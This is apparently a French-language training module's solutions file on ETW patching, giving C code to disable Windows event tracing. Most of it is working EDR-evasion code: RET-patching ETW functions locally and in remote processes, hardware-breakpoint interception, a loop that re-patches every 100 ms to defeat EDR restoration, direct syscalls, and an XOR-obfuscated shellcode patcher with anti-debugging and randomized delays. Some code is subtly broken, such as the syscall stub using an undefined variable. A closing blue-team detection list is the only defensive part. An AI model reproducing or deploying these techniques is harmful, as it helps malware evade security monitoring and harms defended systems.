SOLUTIONS - Module 41 : ETW Patching

AVERTISSEMENT : Solutions educatives uniquement. Jamais utiliser pour evasion EDR malveillante.

Solution 1 : ETW Function Locator

Enumeration complete fonctions ETW dans ntdll.

```c
typedef struct {
    char name[64];
    void* address;
    unsigned char first_bytes[16];
    int is_patched;
} EtwFunction;

void enumerate_etw_functions(EtwFunction* funcs, int* count) {
    const char* etw_funcs[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteString",
        "EtwEventWriteTransfer",
        "EtwNotificationRegister",
        "EtwEventRegister",
        "EtwEventUnregister"
    };

    *count = 0;
    for (int i = 0; i < sizeof(etw_funcs) / sizeof(etw_funcs[0]); i++) {
        void* addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), etw_funcs[i]);
        if (!addr) continue;

        strncpy(funcs[*count].name, etw_funcs[i], 63);
        funcs[*count].address = addr;
        memcpy(funcs[*count].first_bytes, addr, 16);

        // Detecter patch
        unsigned char* bytes = (unsigned char*)addr;
        funcs[*count].is_patched = (bytes[0] == 0xC3 ||  // RET
                                    bytes[0] == 0x90);    // NOP

        (*count)++;
    }

    printf("[+] Found %d ETW functions\n", *count);
    for (int i = 0; i < *count; i++) {
        printf("  %-30s 0x%p %s\n", funcs[i].name, funcs[i].address,
               funcs[i].is_patched ? "[PATCHED]" : "");
    }
}
```

Solution 2 : Multi-Function Patcher

Patch simultane toutes fonctions ETW avec backups.

```c
typedef struct {
    EtwFunction functions[16];
    int count;
    PatchBackup backups[16];
} EtwPatchManager;

int patch_all_etw_functions(EtwPatchManager* manager) {
    enumerate_etw_functions(manager->functions, &manager->count);

    printf("\n[*] Patching %d ETW functions...\n", manager->count);

    for (int i = 0; i < manager->count; i++) {
        if (manager->functions[i].is_patched) {
            printf("[~] %s already patched, skipping\n", manager->functions[i].name);
            continue;
        }

        printf("[*] Patching %s...\n", manager->functions[i].name);

        if (patch_with_ret(manager->functions[i].address,
                          &manager->backups[i]) == 0) {
            printf("[+] %s patched successfully\n", manager->functions[i].name);
        } else {
            printf("[!] Failed to patch %s\n", manager->functions[i].name);
        }
    }

    return 0;
}

int restore_all_etw_functions(EtwPatchManager* manager) {
    printf("\n[*] Restoring all ETW functions...\n");

    for (int i = 0; i < manager->count; i++) {
        if (manager->backups[i].address) {
            printf("[*] Restoring %s...\n", manager->functions[i].name);
            restore_patch(&manager->backups[i]);
        }
    }

    return 0;
}
```

Solution 3 : Stealth Patching (Hardware Breakpoints)

Utilisation debug registers pour interception sans modification memoire.

```c
#ifdef _WIN64
void set_hardware_breakpoint(void* address) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE thread = GetCurrentThread();
    GetThreadContext(thread, &ctx);

    // DR0 = adresse breakpoint
    ctx.Dr0 = (DWORD64)address;

    // DR7 = enable DR0, break on execution
    ctx.Dr7 = 0x00000001;  // Local DR0 enable
    ctx.Dr7 |= 0x00000000; // Execute breakpoint

    SetThreadContext(thread, &ctx);
    printf("[+] Hardware breakpoint set at 0x%p\n", address);
}

LONG CALLBACK exception_handler(EXCEPTION_POINTERS* exception) {
    if (exception->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        void* fault_addr = exception->ExceptionRecord->ExceptionAddress;

        // Check si c'est notre breakpoint ETW
        if (fault_addr == etw_address) {
            printf("[*] ETW call intercepted at 0x%p\n", fault_addr);

            // Simuler return reussi (RAX = 0 = ERROR_SUCCESS)
            exception->ContextRecord->Rax = 0;

            // Skip fonction entiere (ajuster RIP vers caller)
            exception->ContextRecord->Rip = *(DWORD64*)exception->ContextRecord->Rsp;
            exception->ContextRecord->Rsp += 8;

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
#endif
```

Solution 4 : Remote Process Patching

Patch ETW dans process distant via WriteProcessMemory.

```c
int patch_remote_process(DWORD pid) {
    printf("[*] Patching ETW in remote process (PID: %lu)\n", pid);

    HANDLE process = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                                  PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process) {
        printf("[!] Failed to open process\n");
        return -1;
    }

    // Obtenir adresse ntdll dans process distant
    // (meme base que process courant sur Windows 10+)
    HMODULE ntdll_local = GetModuleHandleA("ntdll.dll");
    void* etw_local = GetProcAddress(ntdll_local, "EtwEventWrite");

    // Calculer offset
    uintptr_t offset = (uintptr_t)etw_local - (uintptr_t)ntdll_local;

    // Obtenir base ntdll dans process distant
    HMODULE ntdll_remote = ntdll_local;  // Meme base (ASLR shared)
    void* etw_remote = (void*)((uintptr_t)ntdll_remote + offset);

    printf("[+] Target address: 0x%p\n", etw_remote);

    // Modifier protection
    DWORD old_protect;
    if (!VirtualProtectEx(process, etw_remote, 1, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[!] VirtualProtectEx failed\n");
        CloseHandle(process);
        return -1;
    }

    // Ecrire RET
    unsigned char ret_opcode = 0xC3;
    SIZE_T written;
    if (!WriteProcessMemory(process, etw_remote, &ret_opcode, 1, &written)) {
        printf("[!] WriteProcessMemory failed\n");
        CloseHandle(process);
        return -1;
    }

    printf("[+] ETW patched in remote process\n");
    CloseHandle(process);
    return 0;
}
```

Solution 5 : ETW Provider Enumerator

Enumeration providers ETW actifs avec TDH API.

```c
#include <tdh.h>
#pragma comment(lib, "tdh.lib")

void enumerate_etw_providers(void) {
    PROVIDER_ENUMERATION_INFO* providers = NULL;
    ULONG buffer_size = 0;

    // Premiere appel pour obtenir taille
    TdhEnumerateProviders(providers, &buffer_size);

    providers = (PROVIDER_ENUMERATION_INFO*)malloc(buffer_size);
    if (!providers) return;

    if (TdhEnumerateProviders(providers, &buffer_size) != ERROR_SUCCESS) {
        free(providers);
        return;
    }

    printf("[+] Found %lu ETW providers\n", providers->NumberOfProviders);

    for (ULONG i = 0; i < providers->NumberOfProviders; i++) {
        TRACE_PROVIDER_INFO* provider = &providers->TraceProviderInfoArray[i];

        wchar_t* name = (wchar_t*)((BYTE*)providers + provider->ProviderNameOffset);

        // Afficher providers critiques
        if (wcsstr(name, L"Threat") || wcsstr(name, L"PowerShell") ||
            wcsstr(name, L"Security")) {
            GUID guid = provider->ProviderGuid;
            printf("  [!] CRITICAL: %S\n", name);
            printf("      GUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
                   guid.Data1, guid.Data2, guid.Data3,
                   guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
                   guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
        }
    }

    free(providers);
}
```

Solution 6 : Detection Resistance

Re-patching periodique pour contrer restauration EDR.

```c
DWORD WINAPI monitor_and_repatch(LPVOID param) {
    PatchBackup* backup = (PatchBackup*)param;
    void* etw_addr = backup->address;

    while (1) {
        Sleep(100);  // Check toutes les 100ms

        // Verifier si patch toujours present
        unsigned char current_byte = *(unsigned char*)etw_addr;

        if (current_byte != 0xC3) {  // Patch removed!
            printf("[!] ETW patch removed - reapplying...\n");

            DWORD old_protect;
            VirtualProtect(etw_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect);

            unsigned char ret_opcode = 0xC3;
            memcpy(etw_addr, &ret_opcode, 1);

            VirtualProtect(etw_addr, 1, old_protect, &old_protect);

            printf("[+] ETW re-patched\n");
        }
    }

    return 0;
}
```

Solution 7 : Syscall Direct Implementation

Bypass complet ntdll avec syscalls directs.

```c
// Extraire syscall number depuis ntdll
DWORD get_syscall_number(const char* function_name) {
    void* func = GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name);
    if (!func) return -1;

    unsigned char* bytes = (unsigned char*)func;

    // Pattern x64: MOV R10, RCX; MOV EAX, syscall_number
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        return *(DWORD*)(bytes + 4);
    }

    return -1;
}

// Wrapper syscall direct (x64)
__declspec(naked) NTSTATUS direct_syscall(void) {
    __asm {
        mov r10, rcx
        mov eax, [syscall_number]
        syscall
        ret
    }
}

// Usage
void* allocate_memory_direct(SIZE_T size) {
    static DWORD syscall_number = 0;
    if (syscall_number == 0) {
        syscall_number = get_syscall_number("NtAllocateVirtualMemory");
    }

    void* base = NULL;
    SIZE_T region_size = size;

    // Appel syscall direct (bypass ntdll!)
    NTSTATUS status = direct_syscall();

    return (status == 0) ? base : NULL;
}
```

Solution 8 : ETW Patcher avec Obfuscation

Shellcode patcher chiffre avec execution delayee.

```c
// Shellcode patcher XOR-encode
unsigned char encrypted_patcher[] = {
    0x48, 0x8B, 0xC3, 0x90, 0x33, 0xC9  // Encoded...
};
unsigned char xor_key = 0xAA;

void execute_obfuscated_patcher(void) {
    // Anti-debugging
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }

    // Delay aleatoire (eviter behavioral detection)
    Sleep(rand() % 5000 + 1000);

    // Decoder shellcode
    unsigned char patcher[256];
    for (int i = 0; i < sizeof(encrypted_patcher); i++) {
        patcher[i] = encrypted_patcher[i] ^ xor_key;
    }

    // Executer patcher
    void (*patch_func)(void) = (void(*)(void))patcher;

    DWORD old_protect;
    VirtualProtect(patcher, sizeof(patcher), PAGE_EXECUTE_READWRITE, &old_protect);

    patch_func();

    // Nettoyer traces
    memset(patcher, 0, sizeof(patcher));
}
```

POINTS CLES

- ETW patching tres efficace contre EDR user-mode
- Detection facile via memory scanning ntdll
- Hardware breakpoints plus stealth mais complexe
- Syscalls directs = meilleure evasion long-terme
- Windows 11+ durcit protections (PPL, etc.)

DETECTION PAR BLUE TEAM

1. Memory scanning periodique ntdll.dll
2. Monitoring VirtualProtect sur pages ntdll
3. Anomalies syscalls (direct vs normal ratio)
4. Drop soudain volume events ETW
5. Correlation timeline (patching + activite suspecte)

CONTRE-MESURES

- Kernel-mode monitoring (pas juste ETW user-mode)
- PPL protection processes critiques
- Integrity checks runtime (canaries)
- Multiple telemetry sources (pas seulement ETW)
- Behavioral analysis (actions post-patch)
